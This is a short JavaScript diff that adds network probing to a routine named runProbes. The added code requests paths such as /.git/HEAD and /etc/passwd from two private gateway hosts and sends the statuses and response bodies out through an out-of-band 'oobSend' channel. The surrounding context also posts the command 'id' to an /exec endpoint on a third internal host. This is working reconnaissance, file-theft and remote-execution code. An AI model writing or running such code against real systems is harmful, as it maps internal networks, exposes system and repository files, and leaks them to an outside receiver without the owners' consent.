@@ -73,6 +73,19 @@ async function runProbes() {
     }
   }
 
+  // HTTP probes on 172.18.0.1:80 and 172.18.0.3:80 (ingress/gateway hosts)
+  const gwPaths = ['/', '/health', '/api', '/status', '/metrics', '/info', '/.git/HEAD', '/etc/passwd'];
+  for (const gwHost of ['172.18.0.1', '172.18.0.3']) {
+    const gwResults = await Promise.all(gwPaths.map(p => httpProbe(gwHost, 80, p, `${gwHost}:80${p}`)));
+    const summary = gwResults.map(r => `${r.label.split('/').pop()||'/'}:${r.status||r.error}`).join(' | ');
+    oobSend(`F019RT-GW-${gwHost.replace(/\./g,'_')}`, summary);
+    for (const r of gwResults) {
+      if (r.status && r.status < 404) {
+        oobSend(`F019RT-GW-BODY-${gwHost.replace(/\./g,'_')}-${r.label.split('/').pop()||'root'}`, `status=${r.status} body=${r.body}`);
+      }
+    }
+  }
+
   // Also try 172.18.0.2:8000 POST /exec
   const execReq = new Promise(resolve => {
     const body = JSON.stringify({ cmd: 'id' });
